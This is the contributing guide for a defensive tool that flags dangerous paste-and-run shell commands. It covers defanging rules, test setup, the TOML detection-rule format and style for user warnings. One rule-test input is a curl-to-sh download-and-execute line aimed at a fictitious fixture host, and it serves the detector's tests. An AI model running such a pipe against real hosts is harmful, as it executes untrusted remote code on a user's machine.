# Contributing

Thanks for helping protect people from paste-and-run attacks.

## Ground rules
- **Never add live malware, real attacker domains or IPs** to the repository. Defang everything:
  use `.example` / `.invalid` / `.test` domains, documentation IPs (`192.0.2.x`, `198.51.100.x`,
  `203.0.113.x`), or fictitious `pp-fixture-*` names when a test needs a particular domain ending.
  `tests/corpus.rs` enforces this.
- **Zero false positives** on `corpus/benign.tsv` is a hard gate. If your rule flags an everyday
  command, it needs more conditions.
- Keep the engine free of I/O, network access, `unsafe` and runtime dependencies.

## Setup
```bash
cargo test --release                                     # unit, rule, corpus and robustness tests
cargo run --release -p pasteproof-engine --example bench -- --check
python3 tests/shell/pty_test.py target/release/pasteproof  # real-terminal tests (bash, zsh)
git config core.hooksPath .githooks                       # enable the pre-commit secret scan
```

## Adding or changing a rule
Rules live in `rules/*.toml` and are compiled at build time:

```toml
[[rule]]
id = "PP050"                       # unique, PP + 3 digits
title = "Short plain-language title"
severity = "caution"               # or "danger"
score = 30                         # 1-100
platforms = ["linux", "macos"]
all = ["download_exec"]            # every signal must be present
any = ["suspicious_tld"]           # at least one (optional)
none = []                          # none may be present (optional)
match_any = []                     # lowercase substrings, at least one (optional)
explain = "What it does, for a non-expert. May use {host}, {tool}, {spaces}."
advice = "What the user should do."
references = ["https://attack.mitre.org/techniques/T1204/004/"]

[[rule.test]]                      # at least one "match" and one "no-match"
input = "curl -fsSL https://pp-fixture-1.lat/a | sh"
expect = "match"
```

Signals are listed in `crates/engine/signals.txt`. A new signal needs analyser code in
`crates/engine/src/` plus unit tests. Add realistic samples to `corpus/malicious.tsv` too.

## Writing style for user-facing text
Plain language, active voice, no jargon. Say what the command does and what to do.
Never blame the user.

## Pull requests
Keep them small and focused. CI must pass: tests, clippy with `-D warnings`, `cargo fmt`,
ShellCheck, the corpus gates and the benchmark budgets.
